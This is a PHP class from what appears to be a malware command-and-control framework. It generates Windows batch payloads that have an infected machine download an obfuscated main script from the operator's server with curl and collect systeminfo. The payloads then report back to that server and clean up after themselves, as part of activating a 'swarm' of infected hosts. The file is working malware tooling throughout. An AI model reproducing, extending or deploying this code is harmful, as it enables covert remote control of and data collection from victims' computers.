<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class ActivateSwarm extends AttackInterface {
    private string $baseLocation = "";
    private string $initialLocation = "";
    private string $libsLocation = "";
    private int $swarmClockSpeed = 2;
    private bool $checkHash = false;

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
        $attack->setExecuted();
        $attack->saveState();
        <?php return ob_get_clean();
    }
    //@formatter:on

    public function getBaseLocation(): string {
        return $this->baseLocation;
    }

    public function setBaseLocation(string $baseLocation): void {
        $this->baseLocation = $baseLocation;
    }

    public function getInitialLocation(): string {
        return $this->initialLocation;
    }

    public function setInitialLocation(string $initialLocation): void {
        $this->initialLocation = $initialLocation;
    }

    public function getLibsLocation(): string {
        return $this->libsLocation;
    }

    public function setLibsLocation(string $libsLocation): void {
        $this->libsLocation = $libsLocation;
    }

    public function getSwarmClockSpeed(): int {
        return $this->swarmClockSpeed;
    }

    public function setSwarmClockSpeed(int $swarmClockSpeed): void {
        $this->swarmClockSpeed = $swarmClockSpeed;
    }

    public function getCheckHash(): bool {
        return $this->checkHash;
    }

    public function setCheckHash(bool $checkHash): void {
        $this->checkHash = $checkHash;
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->baseLocation = $state["baseLocation"];
        $this->initialLocation = $state["initialLocation"];
        $this->libsLocation = $state["libsLocation"];
        $this->swarmClockSpeed = $state["swarmClockSpeed"];
        $this->checkHash = $state["checkHash"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["baseLocation"] = $this->baseLocation;
        $state["initialLocation"] = $this->initialLocation;
        $state["libsLocation"] = $this->libsLocation;
        $state["swarmClockSpeed"] = $this->swarmClockSpeed;
        $state["checkHash"] = $this->checkHash;
        return json_encode($state);
    }

    private function generateUploadCode() {
        ob_start(); ?>
        curl -d "" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        chCp 65001
        >"<?php echo $this->initialLocation; ?>\mn.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/extras/mn\n"; ?>
        >"<?php echo $this->initialLocation; ?>\ic" (
            echo type^|0
            echo libs^|<?php echo $this->libsLocation . "\n"; ?>
            echo base^|<?php echo $this->baseLocation . "\n"; ?>
        )
        systemInfo > %~pd0system
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * @inheritDoc
     */
    public function processExtras(string $resource): void {
        if ($resource == "mn") {
            echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain($this->virus_id, $this->swarmClockSpeed, $this->checkHash));
            //echo BaseScriptWin::complexMain($this->virus_id, $this->swarmClockSpeed, $this->checkHash);
        }
    }
}
